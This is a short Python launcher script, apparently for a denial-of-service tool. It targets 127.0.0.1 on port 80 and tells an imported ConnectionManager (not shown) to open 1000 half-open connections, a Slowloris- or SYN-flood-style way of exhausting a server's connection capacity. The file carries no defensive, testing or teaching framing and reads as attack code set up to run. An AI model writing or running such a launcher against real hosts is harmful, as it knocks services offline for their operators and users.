import socket
import threading
from connection_manager import ConnectionManager

def main():
    # Define the target IP and port
    target_ip = '127.0.0.1'
    target_port = 80

    # Number of half-open connections to create
    num_connections = 1000

    # Create a ConnectionManager instance
    manager = ConnectionManager(target_ip, target_port, num_connections)

    # Start creating half-open connections
    manager.start_connections()

if __name__ == "__main__":
    main()